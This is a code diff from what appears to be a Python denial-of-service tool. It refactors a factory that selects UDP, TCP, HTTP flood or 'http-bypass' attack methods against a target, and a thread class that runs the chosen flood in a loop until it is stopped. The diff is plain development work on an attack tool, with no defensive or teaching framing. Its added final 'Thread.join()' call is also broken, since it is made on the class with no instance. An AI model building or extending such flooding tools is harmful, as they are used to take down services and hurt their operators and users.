@@ -15,6 +15,7 @@ Target = 'Target'
 events_journal = EventsJournal()
 
 
+# noinspection PyTypeChecker
 attack_methods: list[AttackMethod] = [
     UdpFlood,
     TcpFlood,
@@ -29,13 +30,13 @@ def attack_method_factory(_ctx: Context, target: Target):
     attack_method_name = target.attack_method
     # events_journal.info(f'Set attack method to {target.attack_method}', target=target)
     if attack_method_name == 'udp-flood':
-        return UdpFlood(target=target, _ctx=_ctx)
+        return UdpFlood(target=target, context=_ctx)
     elif attack_method_name == 'http-flood':
-        return HttpFlood(target=target, _ctx=_ctx)
+        return HttpFlood(target=target, context=_ctx)
     elif attack_method_name == 'tcp-flood':
-        return TcpFlood(target=target, _ctx=_ctx)
+        return TcpFlood(target=target, context=_ctx)
     elif attack_method_name == 'http-bypass':
-        return HttpBypass(target=target, _ctx=_ctx)
+        return HttpBypass(target=target, context=_ctx)
     # Dangerous, may lead to exception
     return None
 
@@ -43,7 +44,7 @@ def attack_method_factory(_ctx: Context, target: Target):
 class Attack(Thread):
     """This class creates threads with specified attack method."""
     _ctx: Context
-    target: Context
+    target: Target
     stop_event: Event = None
 
     def __init__(self, _ctx: Context, target: Target):
@@ -56,12 +57,12 @@ class Attack(Thread):
         self.target = target
         self.target.add_attack_thread(self)
         self.stop_event = threading.Event()
-    
+
     def stop(self):
         self.stop_event.set()
 
     def run(self):
-        runner = attack_method_factory(target=self.target, _ctx=self._ctx)
+        runner = attack_method_factory(_ctx=self._ctx, target=self.target)
 
         if self._ctx.dry_run:
             runner()
@@ -69,3 +70,5 @@ class Attack(Thread):
 
         while not self.stop_event.is_set():
             runner()
+
+        Thread.join()
